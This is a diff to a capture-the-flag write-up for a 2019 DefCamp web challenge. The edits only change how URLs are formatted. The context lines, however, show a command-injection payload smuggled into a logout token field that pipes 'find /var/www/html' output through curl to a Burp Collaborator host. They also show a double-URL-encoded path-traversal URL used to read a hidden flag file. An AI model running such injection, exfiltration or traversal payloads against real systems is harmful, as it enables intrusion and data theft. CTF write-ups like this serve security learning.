@@ -122,7 +122,7 @@ Well that worked pretty quickly. I read an article about png IDAT chunks a while
 
 I used that payload on imgur. It worked.
 
-Apparently even if the file is PNG, you can change extension on imgur and use JPEG. https://i.imgur.com/XkFF9Gx.png to https://i.imgur.com/XkFF9Gx.jpg . Useful trick because dctf imgur platform doesn't allow `.png` files.
+Apparently even if the file is PNG, you can change extension on imgur and use JPEG. `https://i.imgur.com/XkFF9Gx.png` to `https://i.imgur.com/XkFF9Gx.jpg` . Useful trick because dctf imgur platform doesn't allow `.png` files.
 
 I used that, then pointed the LFI payload to the file in profiles/ and snooped around.
 
@@ -312,7 +312,7 @@ My final payload posted was. Be sure to have valid logged in cookies and valid c
 _token=VALID_TOKEN_HERE&logut_token=`find+/var/www/html+|+curl+ddumi7lzrmvbb2eelyq2btme45aoyk.burpcollaborator.net+--data+@-+|+sleep+200`
 ```
 
-You can see I used `find /var/www/html`, exfiltrated the content to burp, noticed `../.flag/.asdpifsudyg8husijdaisonfudbigfhsdijispacdnvsubfhd`, used the following payload to get flag. You can use `https://requestbin.com/` instead of burp collab.
+You can see I used `find /var/www/html`, exfiltrated the content to burp, noticed `../.flag/.asdpifsudyg8husijdaisonfudbigfhsdijispacdnvsubfhd`, used the following payload to get flag. You can use [https://requestbin.com/](https://requestbin.com/) instead of burp collab.
 
 ```
 https://online-album.dctfq19.def.camp/download/%252e%252e%252f%252e%2566%256c%2561%2567%252f%252e%2561%2573%2564%2570%2569%2566%2573%2575%2564%2579%2567%2538%2568%2575%2573%2569%256a%2564%2561%2569%2573%256f%256e%2566%2575%2564%2562%2569%2567%2566%2568%2573%2564%2569%256a%2569%2573%2570%2561%2563%2564%256e%2576%2573%2575%2562%2566%2568%2564
